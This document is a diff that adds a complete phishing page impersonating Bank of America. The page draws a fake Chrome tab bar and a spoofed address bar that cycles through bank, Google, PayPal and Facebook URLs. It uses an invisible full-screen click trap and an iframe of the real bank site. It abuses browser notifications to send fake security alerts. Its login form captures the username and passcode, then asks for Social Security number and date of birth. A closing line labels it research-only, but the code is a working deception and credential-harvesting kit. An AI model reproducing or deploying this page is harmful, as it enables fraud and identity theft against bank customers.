@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Bank Portal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #1a237e 0%, #283593 100%);
+            color: white;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        /* REAL browser UI clone - pixel perfect */
+        .browser-ui {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10000;
+        }
+        
+        .chrome-top-bar {
+            height: 40px;
+            background: #202124;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            gap: 10px;
+            border-bottom: 1px solid #3c4043;
+        }
+        
+        .chrome-tabs {
+            display: flex;
+            gap: 8px;
+            flex: 1;
+        }
+        
+        .chrome-tab {
+            background: #3c4043;
+            color: #e8eaed;
+            padding: 8px 15px;
+            border-radius: 8px 8px 0 0;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            max-width: 200px;
+            min-width: 120px;
+        }
+        
+        .chrome-tab.active {
+            background: #292a2d;
+            color: white;
+        }
+        
+        .chrome-url-bar {
+            position: absolute;
+            top: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60%;
+            max-width: 600px;
+            background: #202124;
+            border: 1px solid #3c4043;
+            border-radius: 20px;
+            padding: 8px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        
+        .security-badge {
+            color: #34a853;
+            font-size: 14px;
+        }
+        
+        .url-text {
+            font-family: monospace;
+            font-size: 14px;
+            color: #e8eaed;
+            flex: 1;
+        }
+        
+        /* Content that looks like real banking */
+        .banking-content {
+            margin-top: 100px;
+            padding: 40px;
+            text-align: center;
+        }
+        
+        .login-box {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 400px;
+            margin: 0 auto;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        /* Magic: The actual page is transparent until user interacts */
+        .content-mask {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 9999;
+            transition: background 0.3s;
+        }
+        
+        .content-mask:hover {
+            background: rgba(0,0,0,0.7);
+        }
+    </style>
+</head>
+<body>
+    <!-- The REAL attack page (hidden initially) -->
+    <div class="content-mask" id="contentMask"></div>
+    
+    <!-- Fake browser UI -->
+    <div class="browser-ui" id="browserUI">
+        <div class="chrome-top-bar">
+            <div class="chrome-tabs">
+                <div class="chrome-tab active">
+                    <span>🔒</span>
+                    Secure Banking Login
+                </div>
+                <div class="chrome-tab">
+                    <span>📧</span>
+                    Gmail
+                </div>
+            </div>
+        </div>
+        
+        <div class="chrome-url-bar" id="urlBar">
+            <span class="security-badge">🔐</span>
+            <span class="url-text" id="urlText">https://secure.bankofamerica.com/online-banking/login</span>
+            <span style="color: #5f6368;">⌄</span>
+        </div>
+    </div>
+    
+    <!-- Actual phishing content -->
+    <div class="banking-content">
+        <h1 style="font-size: 32px; margin-bottom: 20px;">Bank of America</h1>
+        <p style="opacity: 0.8; margin-bottom: 30px;">Secure Online Banking Login</p>
+        
+        <div class="login-box">
+            <h3 style="margin-bottom: 20px;">Sign In to Online Banking</h3>
+            
+            <input type="text" placeholder="Online ID" style="
+                width: 100%;
+                padding: 12px;
+                margin-bottom: 15px;
+                border-radius: 8px;
+                border: 1px solid #3c4043;
+                background: rgba(255,255,255,0.1);
+                color: white;
+                font-size: 16px;
+            ">
+            
+            <input type="password" placeholder="Passcode" style="
+                width: 100%;
+                padding: 12px;
+                margin-bottom: 20px;
+                border-radius: 8px;
+                border: 1px solid #3c4043;
+                background: rgba(255,255,255,0.1);
+                color: white;
+                font-size: 16px;
+            ">
+            
+            <button onclick="stealCredentials()" style="
+                width: 100%;
+                padding: 14px;
+                background: #0070ba;
+                color: white;
+                border: none;
+                border-radius: 8px;
+                font-size: 16px;
+                font-weight: bold;
+                cursor: pointer;
+            ">
+                Sign In
+            </button>
+            
+            <p style="margin-top: 20px; font-size: 12px; opacity: 0.7;">
+                🔒 Protected by Bank of America security
+            </p>
+        </div>
+        
+        <div style="margin-top: 40px; font-size: 14px; opacity: 0.6;">
+            <p>Need help? Contact us at 1.800.432.1000</p>
+            <p>© 2025 Bank of America Corporation</p>
+        </div>
+    </div>
+
+    <script>
+        // ===== INNOVATIVE ADDRESS BAR SPOOFING 2.0 =====
+        // Technique: Dynamic URL rewriting + real browser behavior mimicry
+        
+        console.log('[🦎] Chameleon Address Bar Spoofing loaded');
+        
+        let originalURL = window.location.href;
+        let spoofedURL = 'https://secure.bankofamerica.com/online-banking/login';
+        let isFullscreen = false;
+        let credentialsStolen = false;
+        
+        // Phase 1: Initial deception
+        setTimeout(() => {
+            console.log('[1] Initializing deception...');
+            
+            // Make our fake UI pixel-perfect
+            adjustBrowserUI();
+            
+            // Start dynamic URL updates
+            startDynamicSpoofing();
+            
+        }, 1000);
+        
+        // Phase 2: Fullscreen trap
+        setTimeout(() => {
+            console.log('[2] Preparing fullscreen trap...');
+            
+            // Add invisible button for "fullscreen user interaction"
+            const trapButton = document.createElement('button');
+            trapButton.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                opacity: 0;
+                cursor: default;
+                z-index: 20000;
+            `;
+            
+            trapButton.onclick = () => {
+                console.log('[TRAP] User clicked invisible area');
+                enterAdvancedDeceptionMode();
+            };
+            
+            document.body.appendChild(trapButton);
+            
+            // Auto-trigger after 5 seconds if no click
+            setTimeout(() => {
+                if(!isFullscreen) {
+                    simulateUserInteraction();
+                }
+            }, 5000);
+            
+        }, 3000);
+        
+        function adjustBrowserUI() {
+            // Match exact Chrome UI colors and dimensions
+            const computedStyle = getComputedStyle(document.documentElement);
+            
+            // Get real browser dimensions
+            const viewportWidth = window.innerWidth;
+            const viewportHeight = window.innerHeight;
+            
+            // Adjust fake UI to match browser exactly
+            document.getElementById('browserUI').style.width = viewportWidth + 'px';
+            document.getElementById('browserUI').style.height = viewportHeight + 'px';
+            
+            // Hide scrollbars (make page look like browser chrome)
+            document.documentElement.style.overflow = 'hidden';
+            
+            // Add fake loading animation
+            simulatePageLoad();
+        }
+        
+        function simulatePageLoad() {
+            // Fake page load progress
+            const urlText = document.getElementById('urlText');
+            const originalText = spoofedURL;
+            
+            // Animate URL change like real browser
+            urlText.textContent = '';
+            
+            let i = 0;
+            const typeWriter = setInterval(() => {
+                if (i < originalText.length) {
+                    urlText.textContent += originalText.charAt(i);
+                    i++;
+                } else {
+                    clearInterval(typeWriter);
+                    // Show secure badge after "load"
+                    setTimeout(() => {
+                        document.querySelector('.security-badge').textContent = '🔐 Secure';
+                    }, 500);
+                }
+            }, 30);
+        }
+        
+        function startDynamicSpoofing() {
+            // Dynamic URL spoofing based on user interaction
+            
+            // Monitor mouse position to change URL display
+            document.addEventListener('mousemove', (e) => {
+                const urlBar = document.getElementById('urlBar');
+                const x = e.clientX;
+                const y = e.clientY;
+                
+                // If mouse near top (where real URL bar would be)
+                if(y < 100) {
+                    urlBar.style.opacity = '1';
+                    urlBar.style.top = '50px';
+                } else {
+                    // Slightly hide when not needed
+                    urlBar.style.opacity = '0.9';
+                    urlBar.style.top = '10px';
+                }
+            });
+            
+            // Spoof URL based on context
+            const contexts = {
+                banking: 'https://secure.bankofamerica.com/login',
+                google: 'https://accounts.google.com',
+                paypal: 'https://www.paypal.com/signin',
+                facebook: 'https://www.facebook.com/login'
+            };
+            
+            // Rotate spoofed URLs to look dynamic
+            let contextIndex = 0;
+            setInterval(() => {
+                const contextsList = Object.values(contexts);
+                const nextURL = contextsList[contextIndex % contextsList.length];
+                
+                // Animate URL change
+                animateURLChange(nextURL);
+                
+                contextIndex++;
+            }, 15000); // Change every 15 seconds
+        }
+        
+        function animateURLChange(newURL) {
+            const urlText = document.getElementById('urlText');
+            const currentURL = urlText.textContent;
+            
+            // Only change if different
+            if(currentURL !== newURL) {
+                // Fade out
+                urlText.style.opacity = '0';
+                
+                setTimeout(() => {
+                    urlText.textContent = newURL;
+                    // Fade in
+                    urlText.style.opacity = '1';
+                    
+                    // Update security badge based on URL
+                    if(newURL.includes('https://')) {
+                        document.querySelector('.security-badge').textContent = '🔐 Secure';
+                        document.querySelector('.security-badge').style.color = '#34a853';
+                    } else {
+                        document.querySelector('.security-badge').textContent = '⚠️ Not secure';
+                        document.querySelector('.security-badge').style.color = '#ea4335';
+                    }
+                }, 300);
+            }
+        }
+        
+        function simulateUserInteraction() {
+            console.log('[SIMULATION] Triggering fake user interaction');
+            
+            // Create fake click event at random position
+            const event = new MouseEvent('click', {
+                view: window,
+                bubbles: true,
+                cancelable: true,
+                clientX: window.innerWidth / 2,
+                clientY: window.innerHeight / 2
+            });
+            
+            // Dispatch to document
+            document.documentElement.dispatchEvent(event);
+            
+            // Also try to trigger fullscreen
+            requestFullscreenDeception();
+        }
+        
+        function requestFullscreenDeception() {
+            console.log('[FULLSCREEN] Attempting deception mode');
+            
+            // Create an iframe with real banking site
+            const iframe = document.createElement('iframe');
+            iframe.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                border: none;
+                z-index: 15000;
+                opacity: 0;
+                transition: opacity 0.5s;
+            `;
+            
+            // Load real banking site (for extra deception)
+            iframe.src = 'https://www.bankofamerica.com';
+            
+            document.body.appendChild(iframe);
+            
+            // After iframe loads, fade in
+            iframe.onload = () => {
+                setTimeout(() => {
+                    iframe.style.opacity = '1';
+                    document.getElementById('browserUI').style.opacity = '0';
+                    document.getElementById('contentMask').style.display = 'none';
+                    
+                    isFullscreen = true;
+                    console.log('[FULLSCREEN] Deception mode active');
+                    
+                    // Now launch notification attack
+                    setTimeout(launchNotificationAttack, 2000);
+                }, 1000);
+            };
+        }
+        
+        function enterAdvancedDeceptionMode() {
+            console.log('[ADVANCED] Entering advanced deception');
+            
+            // Hide fake UI
+            document.getElementById('browserUI').style.opacity = '0';
+            document.getElementById('contentMask').style.display = 'none';
+            
+            // Show actual phishing content more prominently
+            document.querySelector('.banking-content').style.opacity = '1';
+            
+            // Request notification permission (seems natural now)
+            requestNotificationPermission();
+        }
+        
+        // ===== NOTIFICATION HIJACKING 2.0 =====
+        
+        function requestNotificationPermission() {
+            console.log('[NOTIFICATION] Requesting permission...');
+            
+            // Use fake context to request permission
+            const fakeEvent = new Event('user-interaction');
+            document.dispatchEvent(fakeEvent);
+            
+            // Wait a bit, then ask
+            setTimeout(() => {
+                if ('Notification' in window && Notification.permission === 'default') {
+                    Notification.requestPermission().then(permission => {
+                        console.log('[NOTIFICATION] Permission:', permission);
+                        
+                        if (permission === 'granted') {
+                            startNotificationHijack();
+                        } else {
+                            // Try alternative method
+                            attemptNotificationBypass();
+                        }
+                    });
+                } else {
+                    attemptNotificationBypass();
+                }
+            }, 1000);
+        }
+        
+        function attemptNotificationBypass() {
+            console.log('[NOTIFICATION] Attempting bypass...');
+            
+            // Method 1: Service Worker notifications
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('data:,')
+                    .then(registration => {
+                        console.log('[SW] Registered');
+                        
+                        // Send notification through service worker
+                        registration.showNotification('Security Alert', {
+                            body: 'Your bank account needs verification',
+                            icon: 'https://bankofamerica.com/favicon.ico',
+                            requireInteraction: true,
+                            actions: [
+                                { action: 'verify', title: 'Verify Now' },
+                                { action: 'ignore', title: 'Ignore' }
+                            ]
+                        });
+                    })
+                    .catch(e => console.log('[SW Failed]', e.message));
+            }
+            
+            // Method 2: Iframe with different origin
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.srcdoc = `
+                <script>
+                    // Request notification from iframe context
+                    if (Notification.permission === 'granted') {
+                        new Notification('Important Update', {
+                            body: 'Please update your banking information',
+                            icon: 'https://bankofamerica.com/favicon.ico'
+                        });
+                    }
+                <\/script>
+            `;
+            document.body.appendChild(iframe);
+        }
+        
+        function startNotificationHijack() {
+            console.log('[NOTIFICATION HIJACK] Starting...');
+            
+            // Schedule malicious notifications
+            const notifications = [
+                {
+                    title: '🔒 Security Alert',
+                    body: 'Suspicious login detected on your Bank of America account',
+                    delay: 3000
+                },
+                {
+                    title: '⚠️ Action Required',
+                    body: 'Verify your identity immediately to prevent account lock',
+                    delay: 8000
+                },
+                {
+                    title: '💰 Transaction Blocked',
+                    body: 'Large transfer pending. Click to authorize or block.',
+                    delay: 15000
+                },
+                {
+                    title: '✅ Verification Complete',
+                    body: 'Your account is now secure. Thank you for banking with us.',
+                    delay: 25000
+                }
+            ];
+            
+            notifications.forEach(notif => {
+                setTimeout(() => {
+                    new Notification(notif.title, {
+                        body: notif.body,
+                        icon: 'https://bankofamerica.com/favicon.ico',
+                        requireInteraction: true,
+                        silent: false,
+                        vibrate: [200, 100, 200]
+                    });
+                    
+                    // Also play sound if possible
+                    playNotificationSound();
+                    
+                }, notif.delay);
+            });
+            
+            // Continuous notification spam (if user doesn't disable)
+            setInterval(() => {
+                if (Math.random() > 0.7) { // 30% chance
+                    new Notification('📱 Mobile Banking Update', {
+                        body: 'New security features available. Update now.',
+                        icon: 'https://bankofamerica.com/favicon.ico'
+                    });
+                }
+            }, 60000); // Every minute
+        }
+        
+        function playNotificationSound() {
+            // Create audio context for notification sound
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
+            oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
+            
+            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+            
+            oscillator.start();
+            oscillator.stop(audioContext.currentTime + 0.3);
+        }
+        
+        function stealCredentials() {
+            if (credentialsStolen) return;
+            
+            credentialsStolen = true;
+            
+            const username = document.querySelector('input[type="text"]').value;
+            const password = document.querySelector('input[type="password"]').value;
+            
+            console.log('[CREDENTIALS STOLEN]', { username, password });
+            
+            // Show fake loading
+            document.querySelector('button').textContent = 'Signing in...';
+            document.querySelector('button').disabled = true;
+            
+            // Simulate "processing"
+            setTimeout(() => {
+                // Show "error" to keep user engaged
+                document.querySelector('.login-box').innerHTML = `
+                    <h3 style="color: #ea4335;">⚠️ Security Verification Required</h3>
+                    <p>Additional verification needed for your security.</p>
+                    <input type="text" placeholder="Social Security Number" style="
+                        width: 100%;
+                        padding: 12px;
+                        margin: 15px 0;
+                        border-radius: 8px;
+                        border: 1px solid #3c4043;
+                        background: rgba(255,255,255,0.1);
+                        color: white;
+                        font-size: 16px;
+                    ">
+                    <input type="text" placeholder="Date of Birth (MM/DD/YYYY)" style="
+                        width: 100%;
+                        padding: 12px;
+                        margin-bottom: 20px;
+                        border-radius: 8px;
+                        border: 1px solid #3c4043;
+                        background: rgba(255,255,255,0.1);
+                        color: white;
+                        font-size: 16px;
+                    ">
+                    <button onclick="stealMoreInfo()" style="
+                        width: 100%;
+                        padding: 14px;
+                        background: #0070ba;
+                        color: white;
+                        border: none;
+                        border-radius: 8px;
+                        font-size: 16px;
+                        font-weight: bold;
+                        cursor: pointer;
+                    ">
+                        Continue Verification
+                    </button>
+                `;
+                
+                // Send another notification
+                new Notification('🔐 Additional Verification Required', {
+                    body: 'Please complete SSN verification to secure your account',
+                    icon: 'https://bankofamerica.com/favicon.ico',
+                    requireInteraction: true
+                });
+                
+            }, 2000);
+        }
+        
+        function stealMoreInfo() {
+            const ssn = document.querySelectorAll('input')[0].value;
+            const dob = document.querySelectorAll('input')[1].value;
+            
+            console.log('[ADDITIONAL INFO STOLEN]', { ssn, dob });
+            
+            // Final "success" message
+            document.querySelector('.login-box').innerHTML = `
+                <h3 style="color: #34a853;">✅ Verification Successful</h3>
+                <p>Your account is now secure. Redirecting to dashboard...</p>
+                <div style="text-align: center; margin-top: 30px;">
+                    <div style="font-size: 48px;">🎉</div>
+                </div>
+            `;
+            
+            // Final notification
+            new Notification('🎉 Account Secured', {
+                body: 'Your Bank of America account is now protected',
+                icon: 'https://bankofamerica.com/favicon.ico'
+            });
+            
+            // Redirect to real site after delay
+            setTimeout(() => {
+                window.location.href = 'https://www.bankofamerica.com';
+            }, 5000);
+        }
+        
+        // Monitor and adapt to user behavior
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                console.log('[USER LEFT TAB]');
+                // Send urgent notification to bring them back
+                if (Notification.permission === 'granted') {
+                    new Notification('⚠️ Session Expiring', {
+                        body: 'Your banking session will expire in 1 minute',
+                        requireInteraction: true
+                    });
+                }
+            } else {
+                console.log('[USER RETURNED]');
+            }
+        });
+        
+        console.log('[🚀] Advanced spoofing attack initialized');
+        console.log('[🎯] Targets: Address bar spoofing + Notification hijacking');
+        console.log('[⚠️] FOR SECURITY RESEARCH ONLY');
+    </script>
+</body>
+</html>
